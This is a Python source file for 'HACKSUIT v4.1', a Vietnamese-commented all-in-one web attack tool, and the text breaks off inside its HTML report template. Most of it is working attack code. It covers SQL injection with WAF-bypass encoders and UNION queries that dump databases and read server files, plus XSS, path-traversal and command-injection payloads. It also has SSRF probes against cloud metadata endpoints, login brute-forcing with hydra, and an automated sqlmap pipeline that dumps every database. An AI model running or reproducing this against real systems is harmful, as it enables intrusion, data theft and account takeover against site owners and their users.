#!/usr/bin/env python3
"""
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██╗   ██╗██╗████████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║╚══██╔══╝
███████║███████║██║     █████╔╝ ███████╗██║   ██║██║   ██║
██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║██║   ██║██║   ██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████║╚██████╔╝██║   ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝
        HACKSUIT v4.1 FULL — All-in-One Web Attack Suite
SQLi | XSS | LFI/RCE | SSRF | CSRF | DirFuzz | Port | Subdomain | CMS | Brute | Nikto | sqlmap | HTML Report
Cài: sudo apt install -y nikto sqlmap nmap hydra
     pip3 install requests beautifulsoup4
"""
import re, sys, os, time, string, argparse, subprocess, shutil, socket, random, concurrent.futures, webbrowser
import requests
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode
from bs4 import BeautifulSoup

# ================= CẤU HÌNH CHUNG =================
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml",
}
TIMEOUT, DELAY = 10, 0.3
PROXY = None
REPORT_DIR = "reports"
C = {"R": "\033[91m", "G": "\033[92m", "Y": "\033[93m", "B": "\033[94m", "M": "\033[95m", "W": "\033[0m"}

def banner():
    print(f"""{C['R']}
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██╗   ██╗██╗████████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║╚══██╔══╝
███████║███████║██║     █████╔╝ ███████╗██║   ██║██║   ██║
██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║██║   ██║██║   ██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████║╚██████╔╝██║   ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝{C['W']}
      HACKSUIT v4.1 FULL — SQLi|XSS|LFI|SSRF|CSRF|Recon|Report
  {'-'*62}""")

def log(msg, level="INFO"):
    colors = {"INFO": C['B'], "OK": C['G'], "WARN": C['Y'], "VULN": C['R'],
              "NIKTO": C['M'], "SQLMAP": C['M'], "XSS": C['M'], "LFI": C['M'],
              "SSRF": C['M'], "CSRF": C['M'], "NMAP": C['M'], "BRUTE": C['M'],
              "DIR": C['M'], "SUB": C['M'], "DATA": C['M']}
    print(f"{colors.get(level,'')}[{level:6}]{C['W']} {msg}")

def ensure_dir(d): os.makedirs(d, exist_ok=True)

def tool_exists(name):
    p = shutil.which(name)
    if not p: log(f"Thiếu tool '{name}'. Cài: sudo apt install {name}", "WARN")
    return p

def rand_marker():
    return "".join(random.choice("abcdef0123456789") for _ in range(8))

# ============================================================
#                    CORE ENGINE (SQLi + injection shared)
# ============================================================
ERROR_PATTERNS = {
    "mysql":    [r"you have an error in your sql syntax", r"warning: mysql", r"mysqli?_"],
    "mssql":    [r"microsoft sql server", r"unclosed quotation mark"],
    "postgres": [r"postgresql.*error", r"unterminated quoted string", r"psql:"],
    "oracle":   [r"\bORA-\d{5}", r"quoted string not properly terminated"],
    "sqlite":   [r"sqlite3?\.\w+error", r"unrecognized token", r"malformed database schema"],
}
TIME_PAYLOADS = {
    "mysql": ["' AND SLEEP({t})-- -", "' AND BENCHMARK(80000000,SHA1('a'))-- -"],
    "mssql": ["'; WAITFOR DELAY '0:0:{t}'-- -"],
    "postgres": ["'; SELECT pg_sleep({t})-- -"],
    "oracle": ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{t})='a'-- -"],
    "sqlite": ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -"],
}
WAF_ENCODERS = [
    ("raw",             lambda p: p),
    ("comment-space",   lambda p: p.replace(" ", "/**/")),
    ("double-comment",  lambda p: p.replace("UNION","UNI/**/ON").replace("SELECT","SE/**/LECT").replace(" ","/**/")),
    ("urlencode",       lambda p: requests.utils.quote(p)),
    ("case-mix",        lambda p: re.sub(r"(union|select|from|and|or)", lambda m: m.group(1).upper(), p, flags=re.I)),
    ("inline-nullbyte", lambda p: p.replace("'", "'%00").replace(" ", "%09")),
]

class Engine:
    def __init__(self, url=None, cookie=None):
        self.url = url
        self.s = requests.Session()
        self.s.headers.update(HEADERS)
        if cookie: self.s.headers["Cookie"] = cookie
        if PROXY: self.s.proxies = {"http": PROXY, "https": PROXY}
        self.s.verify = False
        self.findings = []
        self.current = None
        self.dbms = None
        self.encoder = WAF_ENCODERS[0]
        self.ncols = None
        self.colpos = None
        ensure_dir(REPORT_DIR)

    def req(self, url, data=None, method="GET"):
        time.sleep(DELAY)
        try:
            return self.s.post(url, data=data, timeout=TIMEOUT) if method == "POST" \
                else self.s.get(url, timeout=TIMEOUT)
        except requests.RequestException as e:
            log(f"Lỗi: {e}", "WARN"); return None

    def extract_params(self):
        targets = []
        if self.url and urlparse(self.url).query:
            for p, v in parse_qsl(urlparse(self.url).query):
                targets.append({"url": self.url, "param": p, "base": v, "method": "GET", "data": None})
        r = self.req(self.url) if self.url else None
        if r:
            for form in BeautifulSoup(r.text, "html.parser").find_all("form"):
                action = urljoin(self.url, form.get("action") or self.url)
                fields = {i.get("name"): (i.get("value") or "test") for i in form.find_all("input")
                          if i.get("name") and i.get("type") != "submit"}
                for p in fields:
                    targets.append({"url": action, "param": p, "base": fields[p],
                                    "method": form.get("method", "GET").upper(), "data": fields})
        return targets

    def inject(self, t, payload):
        if t["method"] == "POST":
            d = dict(t["data"]); d[t["param"]] = t["base"] + payload
            return self.req(t["url"], data=d, method="POST")
        qs = dict(parse_qsl(urlparse(t["url"]).query))
        qs[t["param"]] = t["base"] + payload
        u = urlparse(t["url"])
        return self.req(f"{u.scheme}://{u.netloc}{u.path}?{urlencode(qs)}")

    def send(self, payload):
        if self.encoder: payload = self.encoder[1](payload)
        return self.inject(self.current, payload)

    # ---------- SQLi detection ----------
    def detect_dbms(self, text):
        for dbms, pats in ERROR_PATTERNS.items():
            for p in pats:
                if re.search(p, text, re.I): return dbms
        return None

    def sqli_detect(self, t):
        self.current = t
        base_r = self.req(t["url"], data=t["data"], method=t["method"])
        if not base_r: return None
        for q in ["'", '"', "')", "')"]:
            r = self.inject(t, q)
            if r and (d := self.detect_dbms(r.text)):
                return {"type": "error-based", "dbms": d}
        rt = self.inject(t, "' AND 1=1-- -"); rf = self.inject(t, "' AND 1=2-- -")
        if rt and rf and rt.text != rf.text:
            return {"type": "boolean-based", "dbms": None}
        for dbms, pls in TIME_PAYLOADS.items():
            for pl in pls:
                t0 = time.time()
                r = self.inject(t, pl.format(t=6))
                if r and time.time() - t0 > 5:
                    return {"type": "time-based", "dbms": dbms}
        return None

    def waf_bypass(self):
        if not self.current: return False
        r = self.inject(self.current, "' UNION SELECT NULL-- -")
        markers = ["cloudflare","mod_security","forbidden","sucuri","imperva","akamai","blocked","firewall"]
        if r and not any(m in r.text.lower() for m in markers):
            self.encoder = WAF_ENCODERS[0]
            log("Không phát hiện block — encoder raw.", "OK")
            return True
        for name, enc in WAF_ENCODERS[1:]:
            self.encoder = (name, enc)
            r = self.send("' UNION SELECT NULL-- -")
            if r and not any(m in r.text.lower() for m in markers):
                log(f"WAF bypass: {name}", "OK"); return True
        self.encoder = WAF_ENCODERS[0]
        log("Tất cả encoder bị chặn.", "WARN")
        return False

    def find_union(self):
        if not self.current:
            log("Chưa chọn target SQLi.", "WARN"); return False
        n_found = None
        for n in range(1, 51):
            r = self.send(f"' ORDER BY {n}-- -")
            if r and (self.detect_dbms(r.text) or "unknown column" in r.text.lower()):
                n_found = n - 1; break
        if not n_found:
            for n in range(1, 51):
                r = self.send(f"' UNION SELECT {','.join(['NULL']*n)}-- -")
                if r and not self.detect_dbms(r.text):
                    n_found = n; break
        if not n_found:
            log("Không tìm được số cột union.", "WARN"); return False
        self.ncols = n_found
        log(f"Số cột: {n_found}", "OK")
        tag = rand_marker()
        for pos in range(n_found):
            parts = ["NULL"] * n_found
            parts[pos] = f"CONCAT(0x6c61726b7374617274,{tag},0x6c61726b656e64)"
            r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
            if r and tag in r.text:
                self.colpos = pos
                log(f"Cột hiển thị: #{pos+1}", "OK")
                return True
        log("Không tìm thấy cột hiển thị — dùng boolean-blind.", "WARN")
        return False

    def uquery(self, inner):
        if self.ncols is None or self.colpos is None: return None
        parts = ["NULL"] * self.ncols
        parts[self.colpos] = f"CONCAT(0x6c61726b7374617274,IFNULL(({inner}),0x4e554c4c),0x6c61726b656e64)"
        r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
        if not r: return None
        m = re.search(r"larkstart(.*?)larkend", r.text, re.S)
        return m.group(1) if m else None

    def sqli_info(self):
        queries = {
            "mysql":  ["version()","database()","user()","@@hostname"],
            "postgres":["version()","current_database()","current_user","inet_server_addr()::text"],
            "mssql":  ["@@version","DB_NAME()","SYSTEM_USER","@@servername"],
            "oracle": ["(SELECT banner FROM v$version WHERE rownum=1)",
                       "(SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual)","user","'n/a'"],
            "sqlite": ["sqlite_version()","'n/a'","'n/a'","'n/a'"],
        }
        log("== DB INFO ==", "VULN")
        for label, expr in zip(["Version","DB","User","Host"], queries[self.dbms or "mysql"]):
            print(f"  {label:8}: {self.uquery(expr) or 'N/A'}")

    def sqli_dbs(self):
        q = {"mysql":"SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
             "postgres":"SELECT string_agg(datname,',') FROM pg_database",
             "mssql":"SELECT STRING_AGG(name,',') FROM sys.databases"}
        val = self.uquery(q.get(self.dbms or "mysql", q["mysql"]))
        if val: log(f"Databases: {val}", "VULN"); return val.split(",")
        log("Không lấy được DB list.", "WARN")

    def sqli_tables(self, db=None):
        d = self.dbms or "mysql"
        if d == "mysql":
            where = f"table_schema={db}" if db else "table_schema=database()"
            val = self.uquery(f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE {where}")
        elif d == "postgres":
            val = self.uquery("SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'")
        else:
            val = self.uquery("SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'")
        if val: log(f"Tables: {val}", "VULN"); return val.split(",")

    def sqli_cols(self, table):
        val = self.uquery(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'")
        if val: log(f"Columns[{table}]: {val}", "VULN"); return val.split(",")

    def sqli_dump(self, table, cols, limit=20):
        colstr = ",".join(cols[:5])
        inner = f"SELECT GROUP_CONCAT({colstr} SEPARATOR ';|;') FROM (SELECT {colstr} FROM {table} LIMIT {limit}) x"
        val = self.uquery(inner)
        if val:
            log(f"== DUMP {table} ==", "VULN")
            for row in val.split(";|;"): print(f"  | {row}")
        else: log("Dump fail — dùng sqlmap menu [23].", "WARN")

    def sqli_readfile(self, path):
        val = self.uquery(f"SELECT LOAD_FILE('{path}')")
        if val: log(f"File {path}:", "VULN"); print(val[:2000])
        else: log("LOAD_FILE thất bại (cần FILE priv).", "WARN")

# ============================================================
#                    MODULE: XSS
# ============================================================
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<svg onload=alert(1)>',
    '<img src=x onerror=confirm(1)>',
    '"><svg/onload=prompt(1)>',
    "javascript:alert(1)",
    '<iframe src=javascript:alert(1)>',
    '<body onload=alert(1)>',
    '"><Script>alert(1)</scrIpt>',
]

def xss_scan(engine):
    log("=== XSS SCANNER (reflected) ===", "XSS")
    targets = engine.extract_params()
    if not targets:
        log("Không có param để test.", "WARN"); return
    for t in targets:
        for i, pl in enumerate(XSS_PAYLOADS):
            tag = f"hksx{i}"
            payload = pl.replace("alert(1)", f"alert('{tag}')") \
                        .replace("confirm(1)", f"confirm('{tag}')") \
                        .replace("prompt(1)", f"prompt('{tag}')")
            r = engine.inject(t, payload)
            if r and tag in r.text:
                log(f"[!] XSS REFLECTED: {t['param']} → {payload[:50]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "xss",
                                        "payload": payload, "method": t["method"]})
                break
    log("XSS scan xong.", "OK")

# ============================================================
#                    MODULE: LFI / RCE
# ============================================================
LFI_PAYLOADS = [
    "../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd", "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "../../../../etc/passwd%00", "/proc/self/environ",
]
RCE_PAYLOADS = ["; id", "| id", "$(id)", "`id`", "&& id", "; cat /etc/passwd", "$(cat /etc/passwd)"]

def lfi_scan(engine):
    log("=== LFI / RCE SCANNER ===", "LFI")
    targets = engine.extract_params()
    for t in targets:
        for pl in LFI_PAYLOADS:
            r = engine.inject(t, pl)
            if r and re.search(r"root:x:0:0:", r.text):
                log(f"[!] LFI: {t['param']} → {pl[:50]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "lfi",
                                        "payload": pl, "method": t["method"]})
                break
        for pl in RCE_PAYLOADS:
            r = engine.inject(t, pl)
            if r and re.search(r"uid=\d+\(.*?\)", r.text):
                log(f"[!] COMMAND INJECTION: {t['param']} → {pl}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "rce",
                                        "payload": pl, "method": t["method"]})
                break
    log("LFI/RCE scan xong.", "OK")

# ============================================================
#                    MODULE: SSRF
# ============================================================
SSRF_PARAM_HINTS = re.compile(r"url|path|src|dest|redirect|uri|target|fetch|load|page|file|link|host|proxy|next|data|reference|site|html|val|img|domain", re.I)
SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://localhost:8080",
    "http://[::1]", "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "file:///etc/passwd", "gopher://127.0.0.1:25/_HELO", "dict://127.0.0.1:6379/INFO",
]

def ssrf_scan(engine, oob_token=None):
    log("=== SSRF SCANNER ===", "SSRF")
    oob_base = f"https://webhook.site/{oob_token}" if oob_token else None
    if not oob_base:
        log("Tip: tạo token miễn phí tại https://webhook.site để OOB confirm.", "WARN")
    targets = engine.extract_params()
    ssrf_targets = [t for t in targets if SSRF_PARAM_HINTS.search(t["param"])]
    if not ssrf_targets:
        log("Không có param nghi ngờ SSRF. Test tất cả param? (y/N)", "WARN")
        if input().strip().lower() == "y": ssrf_targets = targets
    for t in ssrf_targets:
        for pl in SSRF_PAYLOADS:
            r = engine.inject(t, pl)
            if not r: continue
            text = r.text.lower()
            if re.search(r"ami-id|root:x:0:0:|instance-id|localhost|connection refused|curl error", text):
                log(f"[!] SSRF: {t['param']} → {pl[:50]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "ssrf",
                                        "payload": pl, "method": t["method"]})
                break
        if oob_base:
            canary = f"{oob_base}?ping={t['param']}"
            engine.inject(t, canary)
            time.sleep(3)
            try:
                api = requests.get(f"https://webhook.site/token/{oob_token}/requests", timeout=10).json()
                if api.get("data"):
                    log(f"[!] SSRF OOB CONFIRMED: {t['param']}", "VULN")
                    engine.findings.append({"url": t["url"], "param": t["param"], "type": "ssrf-oob",
                                            "payload": canary, "method": t["method"]})
            except Exception:
                log("Không check được OOB (webhook.site API).", "WARN")
    log("SSRF scan xong.", "OK")

# ============================================================
#                    MODULE: CSRF CHECK
# ============================================================
def csrf_check(engine):
    log("=== CSRF TOKEN CHECK ===", "CSRF")
    r = engine.req(engine.url)
    if not r: return
    forms = BeautifulSoup(r.text, "html.parser").find_all("form")
    if not forms:
        log("Không có form nào trên trang.", "WARN"); return
    csrf_names = re.compile(r"csrf|_token|token|authenticity|xsrf|nonce|anticsrf|__requestverifytoken", re.I)
    for i, form in enumerate(forms):
        action = urljoin(engine.url, form.get("action") or engine.url)
        method = (form.get("method") or "GET").upper()
        fields = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
        hidden = [inp.get("name") for inp in form.find_all("input", type="hidden")]
        if not any(csrf_names.search(f or "") for f in hidden):
            log(f"[!] Form #{i} ({method} {action[:60]}) — KHÔNG có CSRF token. Fields: {fields}", "VULN")
            engine.findings.append({"url": action, "param": f"form#{i}:{','.join(fields[:3])}",
                                    "type": "csrf", "method": method})
        else:
            data = {inp.get("name"): (inp.get("value") or "test") for inp in form.find_all("input")
                    if inp.get("name") and not csrf_names.search(inp.get("name") or "")}
            r2 = engine.req(action, data=data, method=method)
            if r2 and r2.status_code in (200, 302):
                log(f"[?] Form #{i}: submit KHÔNG token → {r2.status_code} — token có thể không validate!", "VULN")
                engine.findings.append({"url": action, "param": f"form#{i}", "type": "csrf-novalidate",
                                        "method": method, "payload": f"status={r2.status_code}"})
    log("CSRF check xong.", "OK")

# ============================================================
#                    MODULE: DIRECTORY FUZZ
# ============================================================
COMMON_DIRS = ["admin","administrator","login","wp-admin","phpmyadmin","backup",".git","config",
               "db","sql","test","dev","uploads",".env","robots.txt",".htaccess","server-status",
               "console","dashboard","user","install","setup","old",".svn","composer.json",
               "web.config","crossdomain.xml","sitemap.xml",".DS_Store","id_rsa","debug"]
DIR_EXTS = ["", ".php", ".bak", ".old", ".txt", ".zip", ".sql"]

def dir_fuzz(engine, threads=20):
    log("=== DIRECTORY FUZZING ===", "DIR")
    u = urlparse(engine.url)
    root = f"{u.scheme}://{u.netloc}"
    base = engine.req(root)
    base_status = base.status_code if base else 404
    found = []
    def probe(path):
        try:
            r = engine.s.get(f"{root}/{path}", timeout=5, allow_redirects=False)
            if r.status_code in (200, 301, 302, 401, 403) and r.status_code != base_status:
                return (path, r.status_code, len(r.text))
        except Exception: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(probe, d + e) for d in COMMON_DIRS for e in DIR_EXTS]
        for f in concurrent.futures.as_completed(futs):
            res = f.result()
            if res:
                path, code, size = res
                color = C['R'] if code in (200, 401, 403) else C['Y']
                print(f"  {color}[{code}]{C['W']} {root}/{path}  ({size} bytes)")
                found.append((path, code))
                if code == 200:
                    engine.findings.append({"url": f"{root}/{path}", "param": "-", "type": "dir", "method": "GET"})
    log(f"Dir fuzz xong — {len(found)} paths.", "OK")
    return found

# ============================================================
#                    MODULE: PORT SCAN
# ============================================================
def port_scan(engine, target=None):
    log("=== PORT SCAN ===", "NMAP")
    host = target or urlparse(engine.url).netloc.split(":")[0]
    try: host = socket.gethostbyname(host)
    except Exception: log(f"Không resolve host: {host}", "WARN"); return
    if tool_exists("nmap"):
        subprocess.run(["nmap", "-sV", "-T4", "--top-ports", "1000", host])
    else:
        log("nmap không có — socket scan fallback.", "WARN")
        common = [21,22,23,25,53,80,110,135,139,143,443,445,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,27017]
        def scan(p):
            s = socket.socket(); s.settimeout(1)
            if s.connect_ex((host, p)) == 0:
                print(f"  {C['R']}[OPEN]{C['W']} {host}:{p}")
            s.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
            list(ex.map(scan, common))

# ============================================================
#                    MODULE: SUBDOMAIN ENUM
# ============================================================
SUBS = ["www","mail","ftp","admin","portal","vpn","dev","test","staging","api","blog","shop",
        "cpanel","webmail","ns1","ns2","remote","git","jenkins","db","cloud","app","intranet"]

def subdomain_enum(engine):
    log("=== SUBDOMAIN ENUMERATION ===", "SUB")
    host = urlparse(engine.url).netloc.split(":")[0]
    parts = host.split(".")
    if len(parts) < 2:
        log("Domain không hợp lệ.", "WARN"); return
    base_domain = ".".join(parts[-2:])
    found = []
    def check(sub):
        fqdn = f"{sub}.{base_domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            return (fqdn, ip)
        except socket.gaierror: return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        for r in ex.map(check, SUBS):
            if r:
                log(f"Tìm thấy: {r[0]} → {r[1]}", "OK")
                found.append(r)
                engine.findings.append({"url": r[0], "param": r[1], "type": "subdomain", "method": "-"})
    if not found: log("Không tìm thấy subdomain.", "WARN")
    return found

# ============================================================
#                    MODULE: CMS DETECTION
# ============================================================
def cms_scan(engine):
    log("=== CMS/TECH DETECTION ===", "INFO")
    r = engine.req(engine.url)
    if not r: return
    html = r.text.lower()
    headers = {k.lower(): v for k, v in r.headers.items()}
    for name, sig in [("WordPress","wp-content"),("WordPress","wp-json"),("Joomla","joomla"),
                      ("Drupal","drupal"),("Magento","magento"),("PrestaShop","prestashop"),("phpBB","phpbb")]:
        if sig in html:
            log(f"CMS: {name}", "VULN")
            if name == "WordPress" and tool_exists("wpscan"):
                log(f"Gợi ý: wpscan --url {engine.url}", "OK")
            break
    if "x-powered-by" in headers: log(f"Backend: {headers['x-powered-by']}", "OK")
    if "server" in headers: log(f"Server: {headers['server']}", "OK")
    for p in ["readme.html","wp-includes/js/version.js","CHANGELOG.txt","CHANGELOG.md"]:
        rr = engine.s.get(urljoin(engine.url, p), timeout=5)
        if rr.status_code == 200 and len(rr.text) > 50:
            log(f"File lộ version: {p} (200)", "WARN")

# ============================================================
#                    MODULE: BRUTE-FORCE LOGIN
# ============================================================
def brute_login(engine):
    log("=== LOGIN BRUTE-FORCE ===", "BRUTE")
    r = engine.req(engine.url)
    if not r: return
    form = BeautifulSoup(r.text, "html.parser").find("form")
    if not form:
        log("Không tìm thấy form login.", "WARN"); return
    action = urljoin(engine.url, form.get("action") or engine.url)
    user_field = next((i.get("name") for i in form.find_all("input")
                       if i.get("name") and re.search(r"user|email|login", i.get("name"), re.I)), "username")
    pass_field = next((i.get("name") for i in form.find_all("input")
                       if i.get("name") and i.get("type") == "password"), "password")
    fail_kw = input("Keyword thất bại (vd 'incorrect', Enter=auto): ").strip() or "incorrect"
    log(f"Form: {action} | user={user_field} pass={pass_field}", "OK")
    if tool_exists("hydra"):
        pl = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(pl):
            pl = os.path.join(REPORT_DIR, "mini_pass.txt")
            with open(pl, "w") as f:
                f.write("\n".join(["admin","password","123456","admin123","root","toor","123456789",
                                   "qwerty","letmein","welcome","password123","1234567890"]))
        host = urlparse(engine.url).netloc.split(":")[0]
        path = urlparse(action).path or "/"
        cmd = ["hydra", "-l", "admin", "-P", pl, host,
               f"http-post-form://{urlparse(engine.url).netloc}{path}",
               f"{user_field}=^USER^&{pass_field}=^PASS^:F={fail_kw}", "-t", "8", "-f"]
        log(f"Hydra: {' '.join(cmd[:6])}...", "BRUTE")
        try: subprocess.run(cmd, timeout=1800)
        except subprocess.TimeoutExpired: log("Hydra timeout.", "WARN")
    else:
        creds = ["admin:admin","admin:password","admin:123456","admin:admin123","root:root","admin:toor"]
        for c in creds:
            u, p = c.split(":")
            rr = engine.req(action, data={user_field: u, pass_field: p}, method="POST")
            if rr and fail_kw.lower() not in rr.text.lower():
                log(f"[!] LOGIN THÀNH CÔNG: {u}:{p}", "VULN")
                engine.findings.append({"url": action, "param": f"{u}:{p}", "type": "brute", "method": "POST"})
                return
        log("Không crack được với mini list.", "WARN")

# ============================================================
#           MODULE: TÍCH HỢP NIKTO + SQLMAP
# ============================================================
def run_nikto(url, html=False):
    if not tool_exists("nikto"): return
    ensure_dir(REPORT_DIR)
    host = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    if html:
        out = os.path.join(REPORT_DIR, f"nikto_{urlparse(url).netloc}_{int(time.time())}.html")
        log(f"Nikto full → {out}", "NIKTO")
        try:
            proc = subprocess.run(["nikto","-h",host,"-Format","html","-o",out,"-nointeractive"],
                                  capture_output=True, text=True, timeout=1800)
            for line in (proc.stdout or "").splitlines():
                if re.search(r"\+\s", line): print(f"  nikto | {line.strip()}")
            log(f"Báo cáo: {out}", "OK")
        except Exception as e: log(f"Nikto error: {e}", "WARN")
    else:
        log(f"Nikto: {host}", "NIKTO")
        try:
            proc = subprocess.Popen(["nikto","-h",host,"-nointeractive"],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout: print(f"  nikto | {line.rstrip()}")
            proc.wait()
        except Exception as e: log(f"Nikto error: {e}", "WARN")

def build_sqlmap_cmd(t, extra=None):
    cmd = ["sqlmap","-u",t["url"],"--batch","--random-agent","--threads=4","--risk=2","--level=3"]
    if t.get("method") == "POST" and t.get("data"): cmd += ["--data", urlencode(t["data"])]
    if t.get("param") and t["param"] != "-": cmd += ["-p", t["param"]]
    if t.get("dbms"): cmd += ["--dbms", t["dbms"]]
    if PROXY: cmd += ["--proxy", PROXY]
    return cmd + (extra or [])

def sqlmap_pipeline(engine):
    if not tool_exists("sqlmap"): return
    sqli_f = [f for f in engine.findings if f.get("type","").startswith(("error","boolean","time"))]
    if not sqli_f:
        log("Chưa có SQLi findings — chạy [1].", "WARN"); return
    t = sqli_f[0]
    log("=== sqlmap PIPELINE: --dbs → dump-all (TỰ ĐỘNG) ===", "SQLMAP")
    try:
        raw = subprocess.run(build_sqlmap_cmd(t, ["--dbs","--threads=6"]),
                             capture_output=True, text=True, timeout=3600).stdout or ""
    except subprocess.TimeoutExpired:
        log("sqlmap --dbs timeout.", "WARN"); return
    dbs = [re.sub(r"^\[\*\] ","",l).strip() for l in raw.splitlines() if re.match(r"^\[\*\] ",l)]
    if not dbs:
        log("Không list được DB — dump-all trực tiếp.", "WARN")
        subprocess.run(build_sqlmap_cmd(t, ["--dump-all"]), timeout=7200); return
    for db in dbs:
        log(f"Dump DB: {db}", "SQLMAP")
        try: subprocess.run(build_sqlmap_cmd(t, ["-D", db, "--dump-all", "--threads=6"]), timeout=7200)
        except subprocess.TimeoutExpired: log(f"Dump {db} timeout.", "WARN")
    log("Pipeline hoàn tất.", "OK")

# ============================================================
#           MODULE: HTML REPORT EXPORTER
# ============================================================
RISK_COLOR = {"error-based":"danger","boolean-based":"danger","time-based":"danger",
              "xss":"warning","lfi":"danger","rce":"danger","ssrf":"danger","ssrf-oob":"danger",
              "csrf":"warning","csrf-novalidate":"warning","dir":"info","brute":"danger","subdomain":"info"}
SEVERITY = {"rce":"CRITICAL","error-based":"CRITICAL","lfi":"HIGH","ssrf":"HIGH","ssrf-oob":"HIGH",
            "boolean-based":"HIGH","time-based":"HIGH","brute":"HIGH","xss":"MEDIUM",
            "csrf":"MEDIUM","csrf-novalidate":"MEDIUM","dir":"LOW","subdomain":"INFO","info":"INFO"}

def export_html_report(engine, target_url=""):
    ensure_dir(REPORT_DIR)
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.html")
    findings = sorted(engine.findings,
                      key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4} \
                          .get(SEVERITY.get(f.get("type","info"),"INFO"), 5))
    counts = {}
    for f in engine.findings:
        s = SEVERITY.get(f.get("type","info"), "INFO")
        counts[s] = counts.get(s, 0) + 1
    rows = ""
    for i, f in enumerate(findings):
        vtype = f.get("type","info")
        sev = SEVERITY.get(vtype, "INFO")
        badge = RISK_COLOR.get(vtype, "secondary")
        rows += f"""<tr>
          <td>{i+1}</td>
          <td><span class="badge bg-{badge}">{sev}</span></td>
          <td><span class="badge bg-dark">{vtype}</span></td>
          <td><code>{f.get('method','-')}</code></td>
          <td style="word-break:break-all">{f.get('url','')[:80]}</td>
          <td><code>{f.get('param','-')}</code></td>
          <td style="word-break:break-all"><code>{f.get('payload','-')[:120]}</code></td>
        </tr>"""
    count_html = " ".join(
        f'<span class="badge bg-{"danger" if s=="CRITICAL" else "warning" if s=="HIGH" else "secondary"}">{s}: {n}</span>'
        for s, n in sorted(counts.items()))
    html = f"""<!DOCTYPE html>
<html lang="vi"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>HACKSUIT v4.1 — Pentest Report</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{{background:#1a1a2e;color:#eee}}.card{{background:#16213e;border:1px solid #0f3460}}.table{{color:#eee}}h1{{color:#e94560}}</style>
</head><body><div class="container py-4">
  <h1>⚠ HACKSUIT v4.1 — Báo cáo Pentest</h1>
  <div class="card mb-3"><div class="card-body">
    <p><strong>Target:</strong> {target_url or engine.url or 'N/A'}</p>
    <p><strong>Thời gian:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
    <p><strong>Tổng findings:</strong> {len(engine.findings)} &nbsp; {count_html}</p>
  </div></div>
  <div class="card mb-3"><div class="card-body table-responsive">
    <h5>Danh sách phát hiện</h5>
    <table class="table table-striped table-hover">
      <thead><tr><th>#</th><th>Mức độ</th><th>Loại</th><th>Method</th><th>URL</th><th>Param</th><th>Payload</th></tr></thead>
      <tbody>{rows or '<tr><td colspan="7" class="text-center">Không có findings — chạy scan trước.</td></tr>'}</tbody>
    </table>
  </div></div>
  <div class="card"><div class="card-body">
    <h5>Khuyến nghị remediation</h5>
    <ul>
      <li><strong>SQLi:</strong> prepared statements/parameterized queries; WAF chỉ là lớp phụ.</li>
      <li><strong>XSS:</strong> escape output theo context; thêm CSP header.</li>
      <li><strong>LFI/RCE:</strong> whitelist path; không gọi shell với input người dùng.</li>
      <li><strong>SSRF:</strong> whitelist outbound domain; chặn IP nội bộ/metadata (169.254.169.254).</li>
      <li><strong>CSRF:</strong> token per-session, validate Server-side; SameSite cookie không đủ.</li>
      <li><strong>Info leak:</strong> gỡ file nhạy cảm, chặn listing, rotate credentials nếu lộ .env/.git.</li>
    </ul>
  </div></div>
